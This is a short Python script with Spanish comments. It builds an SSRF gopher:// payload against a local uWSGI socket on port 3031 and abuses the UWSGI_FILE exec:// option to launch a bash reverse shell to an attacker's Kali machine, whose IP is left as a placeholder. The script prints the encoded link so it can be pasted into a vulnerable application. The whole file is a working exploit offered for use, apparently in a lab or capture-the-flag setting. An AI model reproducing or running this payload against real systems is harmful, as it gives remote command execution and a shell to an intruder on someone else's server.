import urllib.parse

# 1. Configura tu IP de Kali y el puerto de Netcat
KALI_IP = "PON_TU_IP_AQUI" 
KALI_PORT = "4444"

# 2. El comando malicioso que ejecutará el servidor
command = f"bash -c 'bash -i >& /dev/tcp/{KALI_IP}/{KALI_PORT} 0>&1'"

# 3. Construimos el paquete en el idioma secreto de uWSGI
dic = {
    'UWSGI_FILE': 'exec://' + command,
    'SCRIPT_NAME': ''
}

payload = b''
for k, v in dic.items():
    payload += len(k).to_bytes(2, 'little') + k.encode('utf-8')
    payload += len(v).to_bytes(2, 'little') + v.encode('utf-8')

header = b'\x00' + len(payload).to_bytes(2, 'little') + b'\x00'
final_payload = header + payload

# 4. Imprimimos el enlace mágico para copiar y pegar
print("\n--- COPIA EL ENLACE DE ABAJO ---")
print("gopher://127.0.0.1:3031/_" + urllib.parse.quote(final_payload))
print("--------------------------------\n")
